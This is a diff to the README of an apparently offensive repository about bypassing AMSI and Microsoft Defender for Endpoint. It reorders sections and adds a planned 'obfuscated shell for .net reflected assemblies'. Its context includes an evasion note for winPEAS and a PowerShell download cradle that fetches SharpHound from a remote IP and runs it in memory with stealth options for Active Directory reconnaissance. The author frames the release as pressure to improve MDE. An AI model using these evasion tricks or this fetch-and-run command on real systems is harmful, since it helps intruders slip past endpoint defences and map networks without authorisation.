@@ -9,6 +9,10 @@ i hate AMSI
 disabling RTM is for noobs
 </h4>
 
+## why is this public
+
+Even though I hate MDE, showing off how easy it is to bypass AMSI can only help make it better. Right now it is the only protections for a significant amount of home users and smaller enterprises and that is really really bad.
+
 ## bypasses
 
 These are all just for MDE. Anything serious and you're on your own
@@ -32,16 +36,6 @@ These are all just for MDE. Anything serious and you're on your own
 
 - `winPEAS.bat`
     - Obfuscated color line string variable (terrible signature.)
-
-## to-be-added
-
-- `SessionHunter`
-- `PowerView`
-- `Rubeus`
-
-## why is this public
-
-Even though I hate MDE, showing off how easy it is to bypass AMSI can only help make it better. Right now it is the only protections for a significant amount of home users and smaller enterprises and that is really really bad.
 
 ## download cradles
 
@@ -77,3 +71,10 @@ SHARPHOUND TOUCHES DISK OBVIOUSLY
 ```
 iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
 ```
+
+## to-be-added
+
+- `SessionHunter`
+- `PowerView`
+- `Rubeus`
+- obfuscated shell for .net reflected assemblies
